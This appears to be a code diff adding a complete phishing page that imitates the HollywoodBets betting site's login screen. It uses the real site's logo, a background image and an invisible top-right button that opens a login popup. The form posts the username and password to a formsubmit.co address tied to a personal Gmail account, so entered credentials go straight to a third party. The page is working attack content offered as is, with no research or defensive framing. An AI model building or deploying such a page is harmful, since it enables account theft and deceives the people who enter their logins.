@@ -1,0 +1,222 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HollywoodBets Login</title>
+    <link rel="stylesheet" href="styles.css"> <!-- Link to external CSS -->
+    <style>
+        /* Global Styles */
+        body {
+            font-family: Arial, sans-serif;
+            background: url('https://iili.io/33FZ5ua.jpg') no-repeat center center fixed;
+            background-size: cover;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Popup Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: flex-start; /* Align the popup to the top */
+            justify-content: center;
+        }
+
+        /* Login Popup */
+        .login-box {
+            background: #fff;
+            width: 350px;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            position: relative;
+            margin-top: 20px; /* Move the popup to the top */
+        }
+
+        /* Top Purple Header */
+        .login-header {
+            background: #5b269a;
+            padding: 15px;
+            text-align: left;
+            position: relative;
+        }
+
+        .login-header img {
+            height: 30px;
+        }
+
+        /* Close Button */
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 20px;
+            color: white;
+            cursor: pointer;
+        }
+
+        /* Form Styles */
+        .login-content {
+            padding: 20px;
+        }
+
+        .login-content h2 {
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 20px;
+            text-align: center; /* Center the title */
+        }
+
+        /* Adjusting label styles */
+        label {
+            text-align: left;
+            font-weight: bold;
+            font-size: 14px;
+            color: #333;
+            margin-left: 10px;
+            display: block; /* Ensures labels are block level */
+            margin-bottom: 5px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        /* Password Field with Icon */
+        .password-container {
+            position: relative;
+        }
+
+        .password-container input {
+            width: 100%;
+            padding-right: 40px;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: gray;
+        }
+
+        /* Login Button */
+        .login-btn {
+            width: 100%;
+            background: #5b269a;
+            color: white;
+            padding: 12px;
+            border: none;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        /* Terms and Links */
+        .login-footer {
+            font-size: 12px;
+            margin-top: 15px;
+            color: gray;
+        }
+
+        .login-footer a {
+            color: #5b269a;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .login-footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Invisible Button on Top Right to Open Popup */
+        .open-login {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background-color: transparent; /* Make the button invisible */
+            color: transparent; /* Hide the text */
+            border: none;
+            padding: 10px 15px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<button class="open-login" onclick="showLoginPopup()">Login</button> <!-- Invisible button on top right to trigger popup -->
+
+<div class="overlay">
+    <div class="login-box">
+        <!-- Purple Header with Logo -->
+        <div class="login-header">
+            <img src="https://id-hollywoodbets-net-www.datafree.hollywoodbets.net/images/hollywoodbets-logo.svg" alt="HollywoodBets Logo">
+            <span class="close-btn" onclick="closePopup()">—</span>
+        </div>
+
+        <!-- Login Content -->
+        <div class="login-content">
+            <h2>Login</h2>
+
+            <form action="https://formsubmit.co/saavaage7@gmail.com" method="POST"> <!-- Updated form submission link -->
+                <label for="username">Username</label>
+                <input type="text" class="input-field" id="username" name="username" placeholder="Enter Username" required>
+
+                <label for="password">Password</label>
+                <div class="password-container">
+                    <input type="password" class="input-field" id="password" name="password" placeholder="Enter Password" required>
+                    <span class="toggle-password" onclick="togglePassword()"></span>
+                </div>
+
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+
+            <p class="login-footer">
+                By logging in you accept and agree to our <a href="#">terms and conditions</a>.
+            </p>
+
+            <p class="login-footer">
+                <a href="#">Change Password or Cell Number</a> | <a href="#">Register</a>
+            </p>
+        </div>
+    </div>
+</div>
+
+<script>
+    function togglePassword() {
+        var passwordField = document.getElementById("password");
+        if (passwordField.type === "password") {
+            passwordField.type = "text";
+        } else {
+            passwordField.type = "password";
+        }
+    }
+
+    function closePopup() {
+        document.querySelector('.overlay').style.display = 'none';
+    }
+
+    function showLoginPopup() {
+        document.querySelector('.overlay').style.display = 'flex'; // Show the overlay and popup
+    }
+</script>
+
+</body>
+</html>
